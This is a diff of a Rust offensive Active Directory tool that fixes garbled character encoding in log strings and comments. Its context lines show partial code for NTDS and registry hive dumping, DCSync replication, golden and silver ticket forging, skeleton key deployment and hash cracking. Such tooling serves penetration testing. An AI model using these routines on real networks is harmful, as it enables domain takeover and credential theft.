-/// Flow: connect SMB â†’ enable RemoteRegistry â†’ reg save hives â†’ download â†’ parse
+/// Flow: connect SMB → enable RemoteRegistry → reg save hives → download → parse
 async fn exec_dump(
     ctx: &ExecContext,
     state: &mut EngagementState,
@@ -3921,7 +3908,7 @@ async fn exec_dump(
                     let sys_len = sys_data.as_ref().map(|d| d.len()).unwrap_or(0);
                     info!(
                         "  {} NTDS.dit + SYSTEM downloaded ({} + {} bytes)",
-                        "âœ“".green(),
+                        "✓".green(),
                         ntds_len,
                         sys_len,
                     );
@@ -3990,13 +3977,13 @@ async fn exec_dump(
                 downloaded.push((*filename, data));
                 info!(
                     "  {} Downloaded {} ({} bytes)",
-                    "âœ“".green(),
+                    "✓".green(),
                     filename,
                     total_bytes
                 );
             }
             Err(e) => {
-                warn!("  {} Download {}: {}", "âœ—".red(), filename, e);
+                warn!("  {} Download {}: {}", "✗".red(), filename, e);
             }
         }
     }
@@ -4032,7 +4019,7 @@ async fn exec_dump(
                             let nt = cred.nt_hash.as_deref().unwrap_or("aad3b435b51404ee");
                             let lm = cred.lm_hash.as_deref().unwrap_or("aad3b435b51404ee");
                             info!(
-                                "  {} (RID {}) â†’ {}:{}",
+                                "  {} (RID {}) → {}:{}",
                                 cred.username.bold(),
                                 cred.rid.unwrap_or(0),
                                 lm.dimmed(),
@@ -4098,7 +4085,7 @@ async fn exec_dump(
                         entries = creds.len();
                         for cred in &creds {
                             if let Some(ref hash) = cred.nt_hash {
-                                info!("  DCC2: {} â†’ {}", cred.username.bold(), hash.red());
+                                info!("  DCC2: {} → {}", cred.username.bold(), hash.red());
                                 state.add_credential(CompromisedCred {
                                     username: cred.username.clone(),
                                     secret: hash.clone(),
@@ -4133,7 +4120,7 @@ async fn exec_dump(
         downloaded.len(),
         total_bytes
     );
-    info!("{} {}", "  âœ“".green(), msg);
+    info!("{} {}", "  ✓".green(), msg);
     StepResult {
         success: !downloaded.is_empty(),
         output: msg,
@@ -4171,9 +4158,9 @@ async fn start_remote_service(smb: &SmbSession, service_name: &str) -> Result<()
     Ok(())
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // DCSync Executor (MS-DRSR over RPC)
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 async fn exec_dcsync(
     ctx: &ExecContext,
@@ -4248,7 +4235,7 @@ async fn exec_dcsync(
         };
     }
 
-    // Step 3: DRSBind (opnum 0) â€” get DRS handle
+    // Step 3: DRSBind (opnum 0) — get DRS handle
     let mut drs_bind_stub = Vec::new();
     // Client DSA UUID (random)
     let client_uuid: [u8; 16] = rand::random();
@@ -4282,7 +4269,7 @@ async fn exec_dcsync(
     }
     let drs_handle = &drs_bind_resp[24..44];
 
-    // Step 4: DRSGetNCChanges (opnum 3) â€” request replication
+    // Step 4: DRSGetNCChanges (opnum 3) — request replication
     let nc_dn = ctx.base_dn();
     let target_dn = if let Some(user) = target_user {
         // Look up the actual user DN via LDAP to support users in any OU.
@@ -4664,9 +4651,9 @@ fn build_drs_extensions() -> Vec<u8> {
 /// Wire format: NDR referent pointer + embedded DSNAME:
 ///   4 bytes referentId
 ///   4 bytes structLen (total DSNAME size excluding padding)
-///   4 bytes SidLen (0 â€” we don't know the NC SID)
-///  16 bytes Guid (zeroed â€” the DC resolves from the DN)
-///   4 bytes (padding/SID â€” empty)
+///   4 bytes SidLen (0 — we don't know the NC SID)
+///  16 bytes Guid (zeroed — the DC resolves from the DN)
+///   4 bytes (padding/SID — empty)
 ///   N*2 bytes UTF-16LE string name (null-terminated)
 ///   4 bytes NDR max_count at top of the conformant array
 fn build_dsname(dn: &str) -> Vec<u8> {
@@ -4695,9 +4682,9 @@ fn build_dsname(dn: &str) -> Vec<u8> {
     buf
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // Ticket Forging Executors
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 async fn exec_golden_ticket(
     ctx: &ExecContext,
@@ -4776,7 +4763,7 @@ async fn exec_golden_ticket(
         Ok(tgt) => {
             info!(
                 "  {} Golden Ticket forged for {}/{}",
-                "âœ“".green(),
+                "✓".green(),
                 target_user.bold().red(),
                 ctx.domain.cyan()
             );
@@ -4785,7 +4772,7 @@ async fn exec_golden_ticket(
             let kirbi_data = overthrone_hunter::tickets::to_kirbi(&tgt);
             let kirbi_path = format!("./loot/{}_golden.kirbi", ctx.domain.replace('.', "_"));
             if let Ok(()) = tokio::fs::write(&kirbi_path, &kirbi_data).await {
-                info!("  {} Saved to {}", "âœ“".green(), kirbi_path.dimmed());
+                info!("  {} Saved to {}", "✓".green(), kirbi_path.dimmed());
             }
 
             state.loot.push(LootItem {
@@ -4905,7 +4892,7 @@ async fn exec_silver_ticket(
             let spn_safe = spn.replace(['/', '\\'], "_");
             let kirbi_path = format!("./loot/{}_silver.kirbi", spn_safe);
             if let Ok(()) = tokio::fs::write(&kirbi_path, &kirbi_data).await {
-                info!("  {} Saved to {}", "âœ“".green(), kirbi_path.dimmed());
+                info!("  {} Saved to {}", "✓".green(), kirbi_path.dimmed());
             }
 
             state.loot.push(LootItem {
@@ -4927,7 +4914,7 @@ async fn exec_silver_ticket(
                 spn,
                 kirbi_data.len()
             );
-            info!("{} {}", "  âœ“".green(), msg);
+            info!("{} {}", "  ✓".green(), msg);
             StepResult {
                 success: true,
                 output: msg,
@@ -4944,9 +4931,9 @@ async fn exec_silver_ticket(
     }
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // Skeleton Key Executor
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 /// Deploy skeleton key on a domain controller.
 async fn exec_skeleton_key(
@@ -5047,9 +5034,9 @@ async fn exec_skeleton_key(
     }
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // Hash Cracking Executor (inline cracker with hashcat fallback)
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 async fn exec_crack_hashes(
     _ctx: &ExecContext,
@@ -5086,8 +5073,8 @@ async fn exec_crack_hashes(
     // Register cracked credentials
     for cracked in &report.cracked {
         info!(
-            "  {} Cracked: {} â†’ {}",
-            "âœ“".green(),
+            "  {} Cracked: {} → {}",
+            "✓".green(),
             cracked.hash_type.cyan(),
             cracked.password.red()
         );
@@ -5122,13 +5109,13 @@ async fn exec_crack_hashes(
         "Cracked {}/{} hashes ({}ms)",
         cracked_count, report.total_hashes, report.time_ms
     );
-    info!("{} {}", "  âœ“".green(), msg);
+    info!("{} {}", "  ✓".green(), msg);
 
     // If inline cracker failed and we have many hashes, suggest hashcat
     if cracked_count == 0 && hashes.len() > 5 && which_tool("hashcat").await {
         info!(
             "  {} Tip: For GPU-accelerated cracking, run: hashcat -m 13100 hashes.txt rockyou.txt",
-            "â†’".yellow()
+            "→".yellow()
         );
     }
 
@@ -5185,7 +5172,7 @@ fn parse_sid_bytes(bytes: &[u8]) -> String {
 }
 
 /// Strip the RID to get just the domain SID prefix
-/// S-1-5-21-x-y-z-1234 â†’ S-1-5-21-x-y-z
+/// S-1-5-21-x-y-z-1234 → S-1-5-21-x-y-z
 fn domain_sid_prefix(full_sid: &str) -> String {
     match full_sid.rsplitn(2, '-').last() {
         Some(prefix) => prefix.to_string(),
